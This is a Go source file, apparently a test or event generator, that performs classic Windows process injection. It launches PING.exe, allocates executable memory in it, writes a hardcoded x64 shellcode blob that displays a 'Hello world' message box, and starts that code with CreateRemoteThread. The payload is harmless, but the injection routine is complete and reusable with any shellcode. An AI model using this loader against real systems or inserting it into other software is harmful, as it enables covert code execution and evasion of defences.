package events

import (
	"log"
	"syscall"
	"unsafe"

	"github.com/0xrawsec/golang-win32/win32"
	"github.com/0xrawsec/golang-win32/win32/kernel32"
)

var (
	kernel32DLL                   = syscall.NewLazyDLL("kernel32.dll")
	kernel32DLLCreateRemoteThread = kernel32DLL.NewProc("CreateRemoteThread")
)

const (
	MEM_RESERVE = 0x00002000 // Reserves a range of the process's virtual address space without allocating any actual physical storage in memory or in the paging file on disk.
	MEM_COMMIT  = 0x00001000 // Allocates memory charges (from the overall size of memory and the paging files on disk) for the specified reserved memory pages.
)

func CreateRemoteThread() {
	cmdLine := "C:\\Windows\\System32\\PING.exe"
	cmdLineUTF16PtrFromString, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		log.Panicf("[-] Error while obtaining a pointer from the cmdLine(%s) : %v\n", cmdLine, err)
		return
	}

	// Initializing the processInformation and startupInformation of the target prrocess
	var processInformation syscall.ProcessInformation
	var startupInformation syscall.StartupInfo
	startupInformation.Cb = uint32(unsafe.Sizeof(startupInformation))
	processInformation.Process = syscall.Handle(0)
	processInformation.Thread = syscall.Handle(0)
	processInformation.ProcessId = 0
	processInformation.ThreadId = 0

	// Messagebox shellcode payload
	shellcode := []byte{
		0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00,
		0x48, 0x8D, 0x0D, 0x52, 0x00, 0x00, 0x00, 0xE8, 0x9E, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF8,
		0x48, 0x8D, 0x0D, 0x5D, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x5F, 0x00, 0x00,
		0x00, 0x48, 0x8D, 0x0D, 0x4D, 0x00, 0x00, 0x00, 0xE8, 0x7F, 0x00, 0x00, 0x00, 0x4D, 0x33,
		0xC9, 0x4C, 0x8D, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4E, 0x00, 0x00, 0x00,
		0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D,
		0x0A, 0x00, 0x00, 0x00, 0xE8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x4B,
		0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4C, 0x6F, 0x61,
		0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33,
		0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F,
		0x78, 0x41, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x00,
		0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F,
		0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x4C, 0x8B, 0x04, 0x25, 0x60,
		0x00, 0x00, 0x00, 0x4D, 0x8B, 0x40, 0x18, 0x4D, 0x8D, 0x60, 0x10, 0x4D, 0x8B, 0x04, 0x24,
		0xFC, 0x49, 0x8B, 0x78, 0x60, 0x48, 0x8B, 0xF1, 0xAC, 0x84, 0xC0, 0x74, 0x26, 0x8A, 0x27,
		0x80, 0xFC, 0x61, 0x7C, 0x03, 0x80, 0xEC, 0x20, 0x3A, 0xE0, 0x75, 0x08, 0x48, 0xFF, 0xC7,
		0x48, 0xFF, 0xC7, 0xEB, 0xE5, 0x4D, 0x8B, 0x00, 0x4D, 0x3B, 0xC4, 0x75, 0xD6, 0x48, 0x33,
		0xC0, 0xE9, 0xA7, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x58, 0x30, 0x44, 0x8B, 0x4B, 0x3C, 0x4C,
		0x03, 0xCB, 0x49, 0x81, 0xC1, 0x88, 0x00, 0x00, 0x00, 0x45, 0x8B, 0x29, 0x4D, 0x85, 0xED,
		0x75, 0x08, 0x48, 0x33, 0xC0, 0xE9, 0x85, 0x00, 0x00, 0x00, 0x4E, 0x8D, 0x04, 0x2B, 0x45,
		0x8B, 0x71, 0x04, 0x4D, 0x03, 0xF5, 0x41, 0x8B, 0x48, 0x18, 0x45, 0x8B, 0x50, 0x20, 0x4C,
		0x03, 0xD3, 0xFF, 0xC9, 0x4D, 0x8D, 0x0C, 0x8A, 0x41, 0x8B, 0x39, 0x48, 0x03, 0xFB, 0x48,
		0x8B, 0xF2, 0xA6, 0x75, 0x08, 0x8A, 0x06, 0x84, 0xC0, 0x74, 0x09, 0xEB, 0xF5, 0xE2, 0xE6,
		0x48, 0x33, 0xC0, 0xEB, 0x4E, 0x45, 0x8B, 0x48, 0x24, 0x4C, 0x03, 0xCB, 0x66, 0x41, 0x8B,
		0x0C, 0x49, 0x45, 0x8B, 0x48, 0x1C, 0x4C, 0x03, 0xCB, 0x41, 0x8B, 0x04, 0x89, 0x49, 0x3B,
		0xC5, 0x7C, 0x2F, 0x49, 0x3B, 0xC6, 0x73, 0x2A, 0x48, 0x8D, 0x34, 0x18, 0x48, 0x8D, 0x7C,
		0x24, 0x30, 0x4C, 0x8B, 0xE7, 0xA4, 0x80, 0x3E, 0x2E, 0x75, 0xFA, 0xA4, 0xC7, 0x07, 0x44,
		0x4C, 0x4C, 0x00, 0x49, 0x8B, 0xCC, 0x41, 0xFF, 0xD7, 0x49, 0x8B, 0xCC, 0x48, 0x8B, 0xD6,
		0xE9, 0x14, 0xFF, 0xFF, 0xFF, 0x48, 0x03, 0xC3, 0x48, 0x83, 0xC4, 0x28, 0xC3,
	}

	if err := syscall.CreateProcess(
		nil,
		cmdLineUTF16PtrFromString,
		nil,
		nil,
		false,
		0, // syscall.CREATE_SUSPENDED
		nil,
		nil,
		&startupInformation,
		&processInformation); err != nil {
		log.Panicf("[-] Error while creating a new process: %v\n", err)
		return
	} else {
		processId := processInformation.ProcessId
		processHandle := processInformation.Process
		log.Printf("[+] Process Name: %s\n", cmdLine)
		log.Printf("[+] Process ID: %v\n", processId)
		log.Printf("[+] Process Handle: %v\n", processHandle)

		var shellCodeLength win32.SIZE_T = win32.SIZE_T(len(shellcode))
		var virtualAllocExlpAddress win32.LPVOID = win32.LPVOID(0x0)
		buffer, err := kernel32.VirtualAllocEx(win32.HANDLE(processHandle), // Allocate memory in the remote process
			virtualAllocExlpAddress,
			shellCodeLength,
			(win32.DWORD(MEM_RESERVE) | win32.DWORD(MEM_COMMIT)),
			win32.PAGE_EXECUTE_READWRITE)
		if err != nil {
			log.Panicf("[-] Error while allocating memory in the remote process: %v\n", err)
			return
		}

		// Write the shellcode to the remote process
		var bufferLpcVoidMemoryAddress win32.LPCVOID = win32.LPCVOID(buffer)
		kernel32.WriteProcessMemory(win32.HANDLE(processHandle), // Write the shellcode to the remote process
			bufferLpcVoidMemoryAddress,
			shellcode)
		kernel32DLLCreateRemoteThread.Call(uintptr(processHandle), // Create a remote thread in the remote process
			uintptr(0),
			uintptr(0),
			uintptr(buffer),
			uintptr(0),
			uintptr(0),
			uintptr(0))
		log.Printf("[+] Shellcode(%v Bytes) has been injected into the remote process", len(shellcode))
	}
}
